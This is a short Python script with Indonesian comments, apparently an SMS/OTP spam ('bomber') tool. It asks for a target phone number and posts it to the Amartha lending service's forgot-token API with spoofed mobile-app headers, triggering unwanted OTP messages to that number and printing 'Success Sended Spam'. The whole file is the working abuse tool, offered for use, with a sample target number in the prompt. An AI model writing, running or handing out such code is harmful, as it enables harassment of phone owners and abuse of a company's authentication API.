import sys          #untuk fungsi pada terminal, seperti autoclick() dan exit()
import subprocess   #installing python module within code / script (tanpa requirements.txt)

try: #import Module
    import requests #POST, GET, & PUT URL API
    import time     #Untuk Informasi Waktu
    import random   #Untuk Random User
    import os       #Untuk "clear" pada terminal
    import urllib3  #Untuk HTTP Client pada python
    import json     #Agar body Request dapat dilihat dengan cara di print
    import base64   #Untuk variasi output
    import emot     #Untuk menambahkan emot
    import shutil
finally:
    import requests
    import urllib3
    from colorama import Fore,Back,init
    from requests import get,post
    from urllib import request
    from bs4 import BeautifulSoup as bs

from urllib3.exceptions import *
from bs4 import BeautifulSoup as bs
from pip._vendor.requests import post,get # Bisa langsung "from requests import post,get"

# Inisialisasi Variasi Warna Output Terminal.
hijau="\033[1;92m "
putih="\033[1;97m"
abu="\033[1;90m"
kuning="\033[1;93m"
ungu="\033[1;95m"
merah="\033[1;91m"
biru="\033[1;96m"

B = Fore.BLUE
W = Fore.WHITE
R = Fore.RED
G = Fore.GREEN
BL = Fore.BLACK
Y = Fore.YELLOW

nomor = input(f"{W}[{R}• {kuning}•{hijau}•{W}] {biru}Nomor Target Exp: (+6287805746541){W}:")
if "+62" in nomor:
    validasi = nomor.replace("+62","0")
    Amartha = requests.post("https://api.amartha.net/v1/api/register/requestForgotToken",headers={'Host':'api.amartha.net','X-App-Version':'108','Content-Type':'application/json','Content-Length':'24','Accept-Encoding':'gzip, deflate','User-Agent':'okhttp/4.9.0'},data=json.dumps({"phone":""+validasi})).text
    respon = json.loads(Amartha)
    if(respon['stat_code'] == 200):
        print (f"{W}[{G}✓{W}][{G}Success{W}] Success Sended Spam")
    elif(respon['stat_code'] == 400):
        print (f"{W}[{R}x{W}][{R}{respon['stat_code']}{W}] Amartha OTP Limit")
else:
    print(f"{W}[{R}Oops!{W}][{R}Kesalahan Format{W}] Perhatikan Nomor bro!! format nomor awali dengan +62!")